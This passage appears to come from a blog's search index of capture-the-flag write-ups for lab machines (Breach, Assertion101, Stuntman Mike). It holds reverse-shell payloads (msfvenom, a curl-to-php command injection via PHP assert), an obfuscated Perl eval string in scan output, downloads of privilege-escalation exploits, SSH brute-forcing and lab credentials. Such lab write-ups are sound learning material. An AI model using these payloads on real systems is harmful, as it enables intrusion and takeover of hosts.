(Name: x?)514/tcp open pop3 Classic Hamster pop3d (Permission denied)515/tcp open http PMSoftware Simple Web Server RjmgUsaRF|_http-title: Site doesnt have a title.|_http-server-header: PMSoftware-SWS/RjmgUsaRF543/tcp open http Linksys WAGln WAP http config|_http-title: Site doesnt have a title.|_http-server-header: | http-auth: | HTTP/1.0 401 Unauthorized\\x0D|_ Basic realm=Linksys WAGln544/tcp open ssh (protocol 06128519)| fingerprint-strings: | NULL: |_ SSH-06128519-ChWiXrad548/tcp open http Mbedthis-Appweb ho (Juniper router http config; PHP ZTbc; name EfVXptgE)|_afp-serverinfo: ERROR: Script execution failed (use -d to debug)|_http-server-header: Mbedthis-Appweb/ho554/tcp open ftp Blackjumbodog FTPd ...D|_rtsp-methods: ERROR: Script execution failed (use -d to debug)587/tcp open submission?|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed| fingerprint-strings: | NULL: | 220-TiMOS-B-fPyFu both/hops ALCATEL SR mkDnjR Copyright (c) 68Alcatel-Lucent.| 220-All rights reserved. All use subject to applicable license agreements.| 220-Built on i by builder in /relWPBqOxbR/vq/ZXdJhoqNC/panos/main| 220-| 220-This is a Maxcom, system restricted to authorized individuals. This system is subject to monitoring. Unauthorized users, access, and/or modification will be prosecuted.|_ server ready631/tcp open http JBidWatcher httpd 135 (Java)|_http-server-header: JBidWatcher/135 (Java)|_http-title: Site doesnt have a title.| http-auth: | HTTP/1.1 401 Authorization Required|_ Basic realm=JBidWatcher646/tcp open telnet| fingerprint-strings: | NULL: | +Welcome to Viking |_ GlobespanVirata Inc., Software Release x873/tcp open pop3pw Post.Office pop3pw 1381990/tcp open http WindWeb 1NwoPtjYv (Home Gateway router http config)|_ftp-bounce: ERROR: Script execution failed (use -d to debug)|_http-title: Site doesnt have a title (text/html).|_http-server-header: WindWeb/1NwoPtjYv993/tcp open telnet AIX telnetd|_imap-capabilities: CAPABILITY995/tcp open http Teros application firewall|_http-title: Error1025/tcp open NFS-or-IIS?| fingerprint-strings: | NULL: | HTTP/0.0 400 Bad Request|_ Server: MPTMhs 7Service Pack 7 UPnP/665290077, TVersity Media Server1026/tcp open http nginx|_http-title: Site doesnt have a title (text/html; charset=utf-8).1027/tcp open http VMware VirtualCenter httpd 151028/tcp open http D-Link DGE-530T network adapter http config|_http-title: Broadband NAT Router Web-Console 1029/tcp open http Tandberg video conferencing http config1110/tcp open nfsd-status?| fingerprint-strings: | NULL: |_ WWWOFFLE Incorrect Password1433/tcp open ms-sql-s?| fingerprint-strings: | NULL: | GET %2HTTP%2.0|_ p/SliMP3 MP3 player/ i|http://wwwyslimdeviceskcom1720/tcp open telnet1723/tcp open ipp Dell Laser Printer 1700n ippd|_http-title: Dell Laser Printer 1700n1755/tcp open wms?| fingerprint-strings: | NULL: | NOTICE AUTH :*** Looking up your hostname...| NOTICE AUTH :*** Checking Ident|_ NOTICE AUTH :*** ?:Couldnt look up|Found your hostname1900/tcp open jd-gui JD-GUI Java decompiler 0.3.32000/tcp open cisco-sccp?| fingerprint-strings: | NULL: | HTTP/1.345 c|_ Server: Minix httpd c2001/tcp open rtsp Geovision webcam rtspd|_rtsp-methods: ERROR: Script execution failed (use -d to debug)2049/tcp open http-proxy Freenet FProxy (node id qIga)| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION2121/tcp open ccproxy-ftp?| fingerprint-strings: | NULL: | HTTP/1.1 200 OK| pSERVER: EPSON_Linux UPnP/0983495 Epson UPnP SDK/8| | | | |_ 2717/tcp open pn-requester?| fingerprint-strings: | NULL: | version|_ bindaPowerDNS Recursor 288961643000/tcp open irc-proxy dircproxy3128/tcp open squid-http?|_http-open-proxy: Proxy might be redirecting requests| fingerprint-strings: | NULL: | HTTP/1.1 200 OK| MIME-Version: 1.0| Server: JC-HTTPD/zq| Connection: close| Content-Type: text/html| Content-Length: 1r| Accept-Ranges: none| | |_ SX-h/title>3306/tcp open mysql?|_sslv2: ERROR: Script execution failed (use -d to debug)|_ssl-date: ERROR: Script execution failed (use -d to debug)|_mysql-info: ERROR: Script execution failed (use -d to debug)|_tls-alpn: ERROR: Script execution failed (use -d to debug)| fingerprint-strings: | NULL: | HTTP/1.1 302 Moved Temporarily| Connection: Close| Server: Day-Servlet-Engine/HanQiZ | Date: e|_ Location: http://71433:4welcome.html|_ssl-cert: ERROR: Script execution failed (use -d to debug)|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)3389/tcp open ms-wbt-server?| fingerprint-strings: | NULL: | HTTP/1.0 200 OK| Content-length: 6r| Content-type: text/html| | | | ADSL ROUTER Control Panel|_ 3986/tcp open telnet Nortel-LG VoIP IAD telnetd4899/tcp open ftp| fingerprint-strings: | NULL: |_ 220 lm GridFTP Server I (gcck 92849) [Globus Toolkit XTdMBzSKV] ready.5000/tcp open http-proxy NetApp NetCache http proxy ma|_http-title: Site doesnt have a title (text/html).5009/tcp open telnet BusyBox telnetd 1.00-pre7 - 1.14.0| fingerprint-strings: | NULL: | dm500 Jade 1(based on hEo_QII)| welcome on your dreambox! - Kernel O_hWr (2555).|_ dm500 login:5051/tcp open ida-agent?5060/tcp open http CrushFTP DAV httpd (User a)|_http-title: Site doesnt have a title.5101/tcp open http SilverStream Application Server httpd 55|_http-title: Site doesnt have a title.|_http-server-header: SilverStream Server/555190/tcp open aol?| fingerprint-strings: | NULL: | r00000|_ ERR(NOT SUPPORTED)5357/tcp open http Boa httpd (BillionGuard router)|_http-server-header: Embedded HTTP Server.|_http-title: 400 Bad Request5432/tcp open http Icecast streaming media server (SeKIFtCJ [Station])5631/tcp open ftp Hay Systems HSL 2.75G Femtocell ftpd5666/tcp open ftp Minolta PagePro 20 printer ftpd E5800/tcp open ssh (protocol 45365220)| fingerprint-strings: | NULL: |_ SSH-45365220-510 F-Secure SSH Windows NT Server5900/tcp open http Z-World Rabbit microcontroller httpd (Redline AN-50 wireless bridge http config)| http-auth: | HTTP/1.0 401 Unauthorized\\x0D|_ Basic realm=|_http-title: Site doesnt have a title.6000/tcp open http Hitachi Web Server httpd6001/tcp open pop3-proxy InterScan VirusWall pop3 proxy6646/tcp open imap|_imap-capabilities: CAPABILITY| fingerprint-strings: | NULL: |_ * OK Domino IMAP4 Server Release 0ryyMXNbKi +ready +h7070/tcp open http HP/Compaq Integrated Lights-Out http config8000/tcp open smtp|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed| fingerprint-strings: | NULL: |_ 220 o ESMTP MDaemon 587569621?: UNREGISTERED?; c8008/tcp open http Belkin N1 F5D8231-4 WAP http config|_http-server-header: httpd8009/tcp open telnet Qualisys Oqus 300 camera telnetd|_ajp-methods: Failed to get a valid response for the OPTION request8080/tcp open http-proxy?| fingerprint-strings: | NULL: |_ /bin/bash -c {perl,-e,$0,useSPACEMIME::Base64,cHJpbnQgIlBXTkVEXG4iIHggNSA7ICRfPWBwd2RgOyBwcmludCAiXG51cGxvYWRpbmcgeW91ciBob21lIGRpcmVjdG9yeTogIiwkXywiLi4uIFxuXG4iOw==} $_=$ARGV[0];~s/SPACE/ /ig;eval;$_=$ARGV[1];eval(decode_base64($_));8081/tcp open blackice-icecap?| fingerprint-strings: | NULL: |_ OK0100 eXtremail V692 release 7REMote management ...8443/tcp open ssl/https-alt?|_ssl-date: 2023-10-05T15:25:40+00:00; +5h31m08s from scanner time.| ssl-cert: Subject: commonName=Unknown/organizationName=Unknown/stateOrProvinceName=Unknown/countryName=Unknown| Not valid before: 2016-05-20T17:51:07|_Not valid after: 2016-08-18T17:51:078888/tcp open ssh ProFTPD mod_sftp Jwd-l (protocol 2.0)9100/tcp open jetdirect?9999/tcp open http awarrenhttp httpd et (Cyberoam CR200 SSL VPN)|_http-server-header: awarrenhttp/et|_http-title: Site doesnt have a title.10000/tcp open http KGet download manager http interface|_http-title: Site doesnt have a title.|_http-server-header: KGet| http-auth: | HTTP/1.1 401 Authorization Required\\x0D|_ Basic realm=KGet Webinterface Authorization32768/tcp open ftp Intermec PM4i printer ftpd 03086449152/tcp open imap UW imapd 17B|_imap-capabilities: CAPABILITY49153/tcp open smtp|_smtp-commands: SMTP EHLO nmap.scanme.org: failed to receive data: connection closed| fingerprint-strings: | NULL: |_ 220 tijm ESMTP e-CSqL49154/tcp open telnet Huawei STC router telnetd49155/tcp open http AkamaiGHost (Akamais HTTP Acceleration/Mirror service)49156/tcp open http Microsoft IIS httpd 3.X|_http-title: Site doesnt have a title (text/html).49157/tcp open unknown| fingerprint-strings: | NULL: | HTTP/1.0 200 OK| Date: 3}x| | You will automatically be redirected to a secure connection in 2 seconds.| |_ 9 services unrecognized despite returning data.```{: .nolineno}## Web Enumeration â¤µï¸I checked the port 80 and I got this simple page but it source code contains something â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%201.png)Source code â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%202.png)I decoded it with base64 from Cyberchef Tool through online and I got some credentials â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%203.png)```bashpgibbons:damnitfeel$goodtobeagang$ta```{: .nolineno}Now with directory or files bruteforcing I also got some data rather I say urls like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Breach/1]â””â”€$ cat Ferox_80 301 GET 9l 28w 318c http://192.168.110.140/images => http://192.168.110.140/images/200 GET 27l 66w 769c http://192.168.110.140/initech.htmlMSG 0.000 feroxbuster::heuristics detected directory listing: http://192.168.110.140/images (Apache)200 GET 147l 684w 60014c http://192.168.110.140/images/milton_beach.jpg200 GET 26l 147w 1098c http://192.168.110.140/200 GET 459l 2616w 226735c http://192.168.110.140/images/initech.jpg200 GET 1325l 7636w 583611c http://192.168.110.140/images/bill.png```{: .nolineno}I checked the URL `http://192.168.110.140/initech.html` and I also get redirected to another CMS site through clicking on `Employee Portal` tab â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%204.png)Now this CMS name is ImpressCMS and this contains Login page so lets use that credentails here â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%205.png)After Login I ckecked on Inbox there are 3 mails so I checked the 3rd one and I got some File related data like this â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%206.png)I downloaded this data and it is keystore data related to SSL keys â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%207.png)I searched on web related to IT and I got this â†’# Java Keystore> A Java KeyStore is a file that contains certificates. These certificates are used in the Java code. KeyStore and the certificates within it are used to make secure connections from the Java code. The certificates stored can be in several formats. A Java KeyStore is represented by the KeyStore(java.security.KeyStore) class.{: .prompt-tip }**For Example-**Â If we wish to make an API call over HTTP, the server provides us with a certificate containing the public key and our code has to decide whether it trusts the certificate or not.KeyStore stores the following type of data-- Private Keys- Public Keys and certificates- Secret KeysThere is a buildin tool in kali for the key extraction that is called `keytool` .But I need the password so I again searched for anything related to keystore, SSL and I got this â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%208.png)Now lets use this Tool keytool and generate a private key out of the `.keysone` file â†’ ```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Breach/1]â””â”€$ keytool -importkeystore -srckeystore .keystone -destkeystore keystore.p12 -deststoretype PKCS12 -srcalias tomcat -deststorepass tomcat -destkeypass tomcatPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=trueImporting keystore .keystone to keystore.p12...Enter source keystore password:```{: .nolineno}Now I have the `keystore.p12` as a private key can be used to implement SSL/TLS connections and in this case we are using it to make a TLS decoder through including this into the wireshark file and can see the decoded data out of it then â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%209.png)After implementation of TLS decoder on wireshark I can see the decoded data through TLS Stream so I did and got this data â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2010.png)I got this Authorized data and I decoded it with base64 encoding and I got this â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2011.png)After decode I got this â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2012.png)```bashtomcat:Tt\\5D8F(#!*u=G)4m7zB```{: .nolineno}Now Lets load that site where I got the credentials from â†’I was getting error while loading this page I think due to SSL certificate problem so for resolving that I turned on the proxy and then loaded the site and with CA certificate I proceeded to open the site â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2013.png)Now I entered those credentials like this â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2014.png)and I got in the site â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2015.png)So lets upload the msfvenom payload for reverse shell access â†’I used this payload in this case â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Breach/1]â””â”€$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.3 LPORT=4444 -f war -o shell.warPayload size: 1087 bytesFinal size of war file: 1087 bytesSaved as: shell.war```{: .nolineno}I loaded this url and I got the call back â†’![Untitled](/Vulnhub-Files/img/Breach/Untitled%2016.png)As a Response I got this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Vulnhub/Breach/1]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [192.168.110.3] from (UNKNOWN) [192.168.110.140] 43040python3 -c 'import pty;pty.spawn(\"/bin/bash\")'tomcat6@Breach:/var/lib/tomcat6$ whoamiwhoamitomcat6tomcat6@Breach:/var/lib/tomcat6$ ididuid=104(tomcat6) gid=112(tomcat6) groups=112(tomcat6)tomcat6@Breach:/var/lib/tomcat6$```{: .nolineno}I looked for SUIDs now and I got one pkexec so I checked its version and since it is vulnerable so I exploited it and tried to get the root â†’```bashtomcat6@Breach:/$ find / -perm -u=s -type f 2>/dev/null/bin/su/bin/fusermount/bin/umount/bin/ping6/bin/mount/bin/ping/usr/bin/mtr/usr/bin/chfn/usr/bin/newgrp/usr/bin/sudo/usr/bin/traceroute6.iputils/usr/bin/at/usr/bin/chsh/usr/bin/gpasswd/usr/bin/passwd/usr/bin/pkexec/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/authbind/helper/usr/sbin/uuidd/usr/sbin/pppdtomcat6@Breach:/$ which gcc/usr/bin/gcctomcat6@Breach:/$ pkexec --versionpkexec version 0.105tomcat6@Breach:/$ cd /tmptomcat6@Breach:/tmp$```{: .nolineno}I used this [exploit](https://github.com/mebeim/CVE-2021-4034) for pkexec exploitation and tranfered all the files into victim machine â†’```bashtomcat6@Breach:/tmp$ wget http://192.168.110.3/fake_module.c--2023-10-05 10:47:37-- http://192.168.110.3/fake_module.cConnecting to 192.168.110.3:80... connected.HTTP request sent, awaiting response... 200 OKLength: 576 [text/x-csrc]Saving to: â€˜fake_module.câ€™ 0% [ ] 0 --.-K100%[======================================>] 576 --.-K/s in 0.001s 2023-10-05 10:47:37 (391 KB/s) - â€˜fake_module.câ€™ saved [576/576]tomcat6@Breach:/tmp$ lsexpl.sh fake_module.c\thelper.c hsperfdata_tomcat6 tomcat6-tomcat6-tmptomcat6@Breach:/tmp$ chmod +x *tomcat6@Breach:/tmp$ ./expl.sh Pwned!# /bin/bash -iroot@Breach:/tmp# whoamirootroot@Breach:/tmp# iduid=0(root) gid=0(root) groups=0(root),112(tomcat6)root@Breach:/tmp# cd /rootroot@Breach:/root# ls -altotal 60drwx------ 4 root root 4096 Jun 12 2016 .drwxr-xr-x 22 root root 4096 Jun 4 2016 ..-rw------- 1 root root 115 Jun 12 2016 .bash_history-rw-r--r-- 1 root root 3106 Feb 19 2014 .bashrcdrwx------ 2 root root 4096 Jun 6 2016 .cache-rw-r--r-- 1 root root 840 Jun 11 2016 .flag.txt-rw-r--r-- 1 root root 140 Feb 19 2014 .profiledrwxr-xr-x 2 root root 4096 Jun 5 2016 .rpmdb-rw-r--r-- 1 root root 66 Jun 4 2016 .selected_editor-rw-r--r-- 1 root root 23792 Jun 4 2016 flair.jpgroot@Breach:/root# cat .flag.txt -----------------------------------------------------------------------------------______ _ __ _____ _____ _ _____ _ | ___ \\ | | / | | _ | |_ _| | | ___| | || |_/ /_ __ ___ __ _ ___| |__ `| | | |/' |______| | | |__ ___| |__ _ __ __| || ___ \\ '__/ _ \\/ _` |/ __| '_ \\ | | | /| |______| | | '_ \\ / _ \\ __| '_ \\ / _` || |_/ / | | __/ (_| | (__| | | || |_\\ |_/ / | | | | | | __/ |__| | | | (_| |\\____/|_| \\___|\\__,_|\\___|_| |_\\___(_)___/ \\_/ |_| |_|\\___\\____/_| |_|\\__,_|'-----------------------------------------------------------------------------------Congrats on reaching the end and thanks for trying out my first #vulnhub boot2root!Shout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting. root@Breach:/root#```{: .nolineno}>Keystore part was new for me , learned alot.{: .prompt-danger }>Implementing on wireshark was also new for me .{: .prompt-warning }> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Assersion 101", "url": "/posts/Assersion-101/", "categories": "Proving Grounds, Play", "tags": "LFI, PrivEsc, RCE, sudo exploit", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Assertion101]â””â”€$ cat Nmap_results.txt# Nmap 7.94 scan initiated Tue Jul 18 21:13:55 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_r...", "content": "## Port Scan Results âž¡ï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Assertion101]â””â”€$ cat Nmap_results.txt# Nmap 7.94 scan initiated Tue Jul 18 21:13:55 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.187.94Warning: 192.168.187.94 giving up on port because retransmission cap hit (6).Nmap scan report for 192.168.187.94Host is up (0.17s latency).Not shown: 65466 closed tcp ports (reset), 67 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 6e:ce:aa:cc:02:de:a5:a3:58:5d:da:2b:ef:54:07:f9 (RSA)| 256 9d:3f:df:16:7a:e1:59:58:84:4a:e3:29:8f:44:87:8d (ECDSA)|_ 256 87:b5:6f:f8:21:81:d3:3b:43:d0:40:81:c0:e3:69:89 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-title: Assertion|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}---## Web Enumeration âž¡ï¸![Untitled](/Vulnhub-Files/img/Assersion101/Untitled%201.png)Now while surfing I tried LFI on `page` parameter â†’![Untitled](/Vulnhub-Files/img/Assersion101/Untitled%202.png)Now lets try some other type of payloads â¤µï¸[LFI via PHP`s â€˜assertâ€™](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)![Untitled](/Vulnhub-Files/img/Assersion101/Untitled%203.png)payload used like This â†’```bashhttp://192.168.152.94/index.php?page=%27%20and%20die(show_source(%27/etc/passwd%27))%20or%20%27```{: .nolineno}In response I got this â†’![Untitled](/Vulnhub-Files/img/Assersion101/Untitled%204.png)Now lets use another payload for Remote Command Execution (RCE) â†’ ![Untitled](/Vulnhub-Files/img/Assersion101/Untitled%205.png)Lets try reverse shell code â†’```bashhttp://192.168.152.94/index.php?page=' and die(system(\"curl http://192.168.45.152/shell.php|php\")) or '```{: .nolineno}In response to that I got the shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Proving_Ground/Assertion101]â””â”€$ nc -lvnp 4444 listening on [any] 4444 ...connect to [192.168.45.152] from (UNKNOWN) [192.168.152.94] 54592Linux assertion 4.15.0-74-generic #84-Ubuntu SMP Thu Dec 19 08:06:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 17:41:39 up 50 min, 0 users, load average: 0.00, 0.00, 0.11USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: cant access tty; job control turned off$ $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@assertion:/$ whoamiwhoamiwww-datawww-data@assertion:/$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@assertion:/$```{: .nolineno}Now I checked the sudo version and then I exploited the vulnerability of **[CVE-2021-3156 (Sudo Baron Samedit)](https://github.com/worawit/CVE-2021-3156#cve-2021-3156-sudo-baron-samedit)**```bashwww-data@assertion:/home$ sudo -Vsudo -VSudo version 1.8.21p2Sudoers policy plugin version 1.8.21p2Sudoers file grammar version 46Sudoers I/O plugin version 1.8.21p2www-data@assertion:/home$ cd /tmpcd /tmpwww-data@assertion:/tmp$ wget http://192.168.45.152/exploit_nss.pywget http://192.168.45.152/exploit_nss.py--2023-10-09 17:46:10-- http://192.168.45.152/exploit_nss.pyConnecting to 192.168.45.152:80... connected.HTTP request sent, awaiting response... 200 OKLength: 8179 (8.0K) [text/x-python]Saving to: 'exploit_nss.py'exploit_nss.py 0%[ ] 0 --.-KB/exploit_nss.py 100%[===================>] 7.99K --.-KB/s in 0.003s 2023-10-09 17:46:11 (2.95 MB/s) - 'exploit_nss.py' saved [8179/8179]www-data@assertion:/tmp$ www-data@assertion:/tmp$ chmod +x exploit_nss.py\tchmod +x exploit_nss.py www-data@assertion:/tmp$ ls -alls -altotal 16drwxrwxrwt 2 root root 4096 Oct 9 17:46 .drwxr-xr-x 26 root root 4096 Sep 14 2020 ..-rwxrwxrwx 1 www-data www-data 8179 Jun 22 10:25 exploit_nss.pyprw-r--r-- 1 www-data www-data 0 Oct 9 17:24 fwww-data@assertion:/tmp$ python3 exploit_nss.pypython3 exploit_nss.py# /bin/bash -i/bin/bash -iroot@assertion:/tmp# whoamiwhoamirootroot@assertion:/tmp# ididuid=0(root) gid=0(root) groups=0(root),33(www-data)root@assertion:/tmp# cd /rootcd /rootroot@assertion:/root# ls -alls -altotal 36drwx------ 5 root root 4096 Oct 9 16:54 .drwxr-xr-x 26 root root 4096 Sep 14 2020 ..lrwxrwxrwx 1 root root 9 Jan 16 2020 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 3 root root 4096 Jan 16 2020 .cachedrwx------ 3 root root 4096 Jan 16 2020 .gnupg-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 Jan 16 2020 .ssh-rw------- 1 root root 0 Sep 8 2020 .viminfo-rw-r--r-- 1 root root 33 Oct 9 16:54 proof.txt-rw-r--r-- 1 root root 32 Sep 8 2020 root.txtroot@assertion:/root# cat root.txtcat root.txtYour flag is in another file...root@assertion:/root# cat proof.txtcat proof.txtFLAGFLAGFLAGFLAGFLAGroot@assertion:/root# cd /root@assertion:/# find / -name local.txt 2>/dev/nullfind / -name local.txt 2>/dev/null/var/www/local.txtroot@assertion:/# cat /var/www/local.txtcat /var/www/local.txtFLAGFLAGFLAGFLAGFLAGroot@assertion:/# ifconfigifconfigens192: flags=4163 mtu 1500 inet 192.168.152.94 netmask 255.255.255.0 broadcast 192.168.152.255 inet6 fe80::250:56ff:feba:8eed prefixlen 64 scopeid 0x20 ether 00:50:56:ba:8e:ed txqueuelen 1000 (Ethernet) RX packets 1903 bytes 201740 (201.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 2063 bytes 2686114 (2.6 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73 mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 786 bytes 61626 (61.6 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 786 bytes 61626 (61.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0root@assertion:/#```{: .nolineno}I am root now I can access all the flags !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Stuntman Mike", "url": "/posts/Stuntman/", "categories": "PwnTillDawn", "tags": "SSH Bruteforce", "date": "2023-09-24 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.166]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.166Nmap scan report for 10.150.150.166Host is up (...", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.166]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.166Nmap scan report for 10.150.150.166Host is up (0.19s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 (protocol 2.0)| ssh-hostkey: | 2048 b7:9e:99:ed:7e:e0:d5:83:ad:c9:ba:7c:f1:bc:44:06 (RSA)| 256 7e:53:59:7b:2d:6c:3b:d7:21:28:cb:cb:78:af:99:78 (ECDSA)|_ 256 c5:d2:2d:04:f9:69:40:4c:15:34:36:fe:83:1f:f3:44 (ED25519)8089/tcp open ssl/http Splunkd httpd| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser| Not valid before: 2019-10-25T09:15:13|_Not valid after: 2022-10-24T09:15:13|_http-server-header: Splunkd|_http-title: splunkd| http-robots.txt: 1 disallowed entry |_/Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .```{: .nolineno}## Web Enumeration â¤µï¸Now I got splunkd open on port 8089 :![Untitled](/Vulnhub-Files/img/Stuntman%20Mike/Untitled%201.png)while tring ssh on this machine I got this one FLAG â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.166]â””â”€$ ssh 10.150.150.166 The authenticity of host '10.150.150.166 (10.150.150.166)' cant be established.ED25519 key fingerprint is SHA256:wCj0PIambullovu4ygX2+b6IVT8d8x2gEDeOB2D3OE4.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.150.150.166' (ED25519) to the list of known hosts.You are attempting to login to stuntman mike is server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360kali@10.150.150.166s password: Permission denied, please try again.kali@10.150.150.166 is password: Permission denied, please try again.kali@10.150.150.166 is password: kali@10.150.150.166: Permission denied (publickey,password).```{: .nolineno}Then I tried bruteforce into the username as mike for SSH login and as a result I got it â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.166]â””â”€$ hydra -l mike -P /usr/share/wordlists/rockyou.txt ssh://10.150.150.166 -t 4 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-18 14:34:52[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task[DATA] attacking ssh://10.150.150.166:22/[22][ssh] host: 10.150.150.166 login: mike password: babygirl1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-18 14:35:05```{: .nolineno}Credentials are â†’```bashmike : babygirl```{: .nolineno}Now it SSH time â†’## SSH Login â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/PwnTillDawn/10.150.150.166]â””â”€$ ssh mike@10.150.150.166 You are attempting to login to stuntman mikes server - FLAG35=724a2734e80ddbd78b2694dc5eb74db395403360mike@10.150.150.166 password: Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Sep 18 09:42:35 UTC 2023 System load: 0.01 Processes: 167 Usage of /: 28.7% of 19.56GB Users logged in: 1 Memory usage: 20% IP address for ens33: 10.150.150.166 Swap usage: 0% * Canonical Livepatch is available for installation. - Reduce system reboots and improve kernel security. Activate at: https://ubuntu.com/livepatch18 packages can be updated.0 updates are security updates.Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings*** System restart required ***Last login: Tue Apr 21 08:57:00 2020mike@stuntmanmike:~$```{: .nolineno}Now lets check how this user can get me to root â†’```bashmike@stuntmanmike:~$ sudo -l[sudo] password for mike: Sorry, try again.[sudo] password for mike: Matching Defaults entries for mike on stuntmanmike: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser mike may run the following commands on stuntmanmike: (ALL : ALL) ALLmike@stuntmanmike:~$ sudo /bin/bash -iroot@stuntmanmike:~# whoamirootroot@stuntmanmike:~# iduid=0(root) gid=0(root) groups=0(root)root@stuntmanmike:~# cd /rootroot@stuntmanmike:/root# ls -altotal 36drwx------ 4 root root 4096 May 14 2020 .drwxr-xr-x 23 root root 4096 Jan 30 2022 ..-rw------- 1 root root 721 Apr 21 2020 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc-rw-r--r-- 1 root root 115 May 14 2020 CAM.shortcut-rw-r--r-- 1 root root 41 May 27 2019 FLAG37drwxr-xr-x 3 root root 4096 May 27 2019 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profiledrwx------ 2 root root 4096 May 27 2019 .sshroot@stuntmanmike:/root# cat FLAG37 28d10397e475a50fc0d6c73f7c23355ebdf15a3froot@stuntmanmike:/root#```{: .nolineno}>It was time waste for me after I got the username from hid & trial 